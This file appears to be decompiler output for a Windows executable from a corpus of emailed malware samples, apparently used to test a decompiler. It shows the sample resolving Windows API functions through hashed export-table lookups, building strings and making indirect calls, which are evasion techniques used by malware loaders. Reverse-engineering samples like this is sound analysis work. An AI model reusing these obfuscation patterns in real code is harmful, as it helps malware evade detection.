// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0105/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000()
{
	return;
}

word32 fn0040100B(Eq_4 * fs, word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc14_15 = fs->dw0000;
	fs->dw0000 = fp - 0x00000014;
	fn00401000();
	fn00401000();
	Eq_17 * eax_94 = (dwArg04->dw003C + dwArg04)->dw0078 + dwArg04;
	word16 * eax_98[] = eax_94->dw0024 + dwArg04;
	fn00401000();
	lstrcpyA(fp - 0x0000003C, 0x00403010);
	lstrcpyA(fp - 0x0000003C, 0x0040300E);
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) != 0x00000000)
		dwArg08 = dwArg08 + 0x000339E2;
	fp->dwFFFFFFF8 = 0x0040300C;
	fp->dwFFFFFFF8 = fp - 0x0000003C;
	lstrcpyA(0x00000000, 0x00000000);
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000000;
	fp->dwFFFFFFF8 = 0x00000852;
	if (SetFileSecurityA(0x00000000, 0x00000000, 0x00000000) == 0x00000000)
		dwArg08 = dwArg08 + 0x0003C707;
	fp->dwFFFFFFF8 = 0xFFFFFFFF;
	word32 * eax_187[] = eax_94->dw0020 + dwArg04;
	word32 * eax_192[] = eax_94->dw001C + dwArg04;
	int32 edi_194 = 0x00000000;
	word32 eax_225;
	while (edi_194 < eax_94->dw0018)
	{
		fp->dwFFFFFFF8 = 0x00000068;
		fp->dwFFFFFFF8 = 0x00000068;
		fp->dwFFFFFFF8 = 0x00000068;
		fp->dwFFFFFFF8 = 0x00000068;
		fp->dwFFFFFFF8 = 0x00000068;
		fp->dwFFFFFFF8 = 0x00000006;
		fp->dwFFFFFFF8 = 0x00000008;
		fp->dwFFFFFFF8 = 0x00000006;
		fp->dwFFFFFFF8 = 0x00000008;
		fp->dwFFFFFFF8 = 0x00000008;
		fp->dwFFFFFFF8 = 0x00000006;
		fn00401000();
		dwLoc48 = dwLoc48 & 0x00000000;
		word32 eax_276 = eax_187[edi_194] + dwArg04;
		dwLoc50 = dwLoc50 & 0x00000000;
		while (dwLoc50->b0000 != 0x00)
		{
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000006;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000006;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000006;
			fn00401000();
			dwLoc48 = (int32) dwLoc50->b0000 ^ 0x00000080 ^ (dwLoc48 << 0x00000007 | dwLoc48 >>u 0x00000019);
			dwLoc50 = dwLoc50 + 0x00000001;
		}
		if (dwLoc48 == dwArg08)
		{
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000068;
			fp->dwFFFFFFF8 = 0x00000006;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000006;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000008;
			fp->dwFFFFFFF8 = 0x00000006;
			fn00401000();
			eax_225 = eax_192[(word32) eax_98[edi_194]] + dwArg04;
			goto l0040121B;
		}
		edi_194 = edi_194 + 0x00000001;
	}
	eax_225 = 0x00000000;
l0040121B:
	fs->dw0000 = dwLoc14_15;
	return eax_225;
}

void fn0040157B()
{
	GetModuleHandleA(0x00000000);
	fn00401000();
	fn00401000();
	Mem0[0x004047E4:word32]();
	Mem0[0x004047E8:word32]();
	globals->dw4047EC = 0x00010007;
	Mem106[0x00404AB8:word32]();
	fn00401000();
	globals->dw4048A4 = 0x0040122E;
	fn00401000();
	Mem141[0x00404ABC:word32]();
	Mem141[0x00404AC0:word32]();
	return;
}

void fn0040168C(Eq_4 * fs)
{
	word32 eax_14 = LoadLibraryA(globals->t40405C);
	fn00401000();
	CloseHandle(0x00000009);
	globals->ptr404AC4 = fn0040100B(fs, eax_14, 0xDF03EE0B);
	fn00401000();
	GetFileType(0x00000007);
	GetModuleHandleA(0x00000000);
	globals->ptr4047E4 = fn0040100B(fs, eax_14, 0x038DDC6A);
	globals->ptr4047E8 = fn0040100B(fs, eax_14, 0x6713D9F9);
	fn00401000();
	globals->ptr404AB8 = fn0040100B(fs, eax_14, 0x332E86E3);
	fn00401000();
	globals->ptr404ABC = fn0040100B(fs, eax_14, 0x332EAEE3);
	fn00401000();
	globals->ptr404AC0 = fn0040100B(fs, eax_14, 0xEABADBF3);
	fn00401000();
	globals->ptr404AC8 = fn0040100B(fs, eax_14, 0x45B999DE);
	fn00401000();
	globals->ptr404ACC = fn0040100B(fs, eax_14, 0x04B24FD1);
	globals->ptr4043D0 = fn0040100B(fs, eax_14, 0x599EE4EE);
	GetModuleFileNameA(0x00000000, 0x00404AD0, 0x00000104);
	lstrcpyA(0x00404BD4, globals->t404028);
	lstrcatA(0x00404BD4, globals->t404054);
	lstrcatA(0x00404BD4, globals->t404010);
	word32 eax_326 = lstrcatA(0x00404BD4, 0x00404AD0);
	globals->dw404CD8 = 0x00000044;
	fn00401000();
	globals->dw404D04 = 0x00000001;
	fn00401000();
	globals->w404D08 = 0x0002;
	fn00401000();
	Mem388[0x00404AC4:word32]();
	fn00401000();
	lstrcpyA(fp - 0x00000024, globals->t40403C);
	lstrcatA(fp - 0x00000024, globals->t404030);
	lstrcatA(fp - 0x00000024, globals->t404048);
	lstrcatA(fp - 0x00000024, globals->t404034);
	Mem388[0x004043D0:word32]();
	globals->ptr404D1C = fn0040100B(fs, fp - 0x00000024, 0xB75F6ECA);
	globals->ptr404D20 = fn0040100B(fs, fp - 0x00000024, 0x916B591F);
	globals->ptr404D24 = fn0040100B(fs, fp - 0x00000024, 0x214EDBAA);
	globals->ptr404D28 = fn0040100B(fs, fp - 0x00000024, 0x83124FAE);
	fn00401000();
	code * eax_562 = fn0040100B(fs, fp - 0x00000024, 0xAAA79DE0);
	globals->ptr404D2C = eax_562;
	fn00401000();
	Mem564[0x004043D0:word32]();
	fn00401000();
	code * eax_630 = fn0040100B(fs, 0x00000000, 0xCE39AC51);
	globals->ptr404D30 = eax_630;
	fn00401000();
	fn0040157B();
	fn00401000();
	Mem632[0x00404ACC:word32]();
	return;
}

